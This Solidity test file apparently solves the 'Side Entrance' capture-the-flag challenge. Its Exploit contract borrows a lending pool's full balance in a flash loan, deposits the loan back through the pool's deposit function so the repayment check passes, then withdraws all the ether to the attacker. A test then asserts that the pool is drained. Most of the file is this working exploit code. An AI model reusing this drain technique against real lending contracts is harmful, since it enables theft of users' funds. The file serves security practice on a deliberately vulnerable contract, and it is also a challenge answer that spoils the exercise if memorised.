// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {DSTest} from "ds-test/test.sol";
import {Utilities} from "../../utils/Utilities.sol";
import {console} from "../../utils/Console.sol";
import {Vm} from "forge-std/Vm.sol";
import {Address} from "openzeppelin-contracts/utils/Address.sol";
import {SideEntranceLenderPool, IFlashLoanEtherReceiver} from "../../../Contracts/side-entrance/SideEntranceLenderPool.sol";

contract Exploit is IFlashLoanEtherReceiver {
    using Address for address payable;

    SideEntranceLenderPool private pool;
    address private owner;

    constructor(SideEntranceLenderPool _pool) {
        owner = msg.sender;
        pool = _pool;
    }

    function execute() external payable {
        require(msg.sender == address(pool), "Sender is not a pool");
        pool.deposit{value: msg.value}();
    }

    function run() external {
        require(msg.sender == owner, "Not an owner");
        uint256 poolBalance = address(pool).balance;
        pool.flashLoan(poolBalance);
        pool.withdraw();

        payable(owner).sendValue(address(this).balance);
    }

    receive() external payable {}
}

contract SideEntrance is DSTest {
    Vm internal immutable vm = Vm(HEVM_ADDRESS);

    uint256 internal constant ETHER_IN_POOL = 1_000e18;

    Utilities internal utils;
    SideEntranceLenderPool internal sideEntranceLenderPool;
    address payable internal attacker;
    uint256 public attackerInitialEthBalance;

    function setUp() public {
        utils = new Utilities();
        attacker = payable(address(1));
        vm.label(attacker, "Attacker");

        sideEntranceLenderPool = new SideEntranceLenderPool();
        vm.label(address(sideEntranceLenderPool), "Side Entrance Lender Pool");

        vm.deal(address(sideEntranceLenderPool), ETHER_IN_POOL);

        assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);

        attackerInitialEthBalance = address(attacker).balance;

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/
        console.log("attackers init balance: ", attackerInitialEthBalance);
        vm.startPrank(attacker);
        Exploit expl = new Exploit(sideEntranceLenderPool);
        expl.run();
        vm.stopPrank();
        console.log("attackers balance: ", address(attacker).balance);
        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        assertEq(address(sideEntranceLenderPool).balance, 0);
        assertGt(attacker.balance, attackerInitialEthBalance);
    }
}
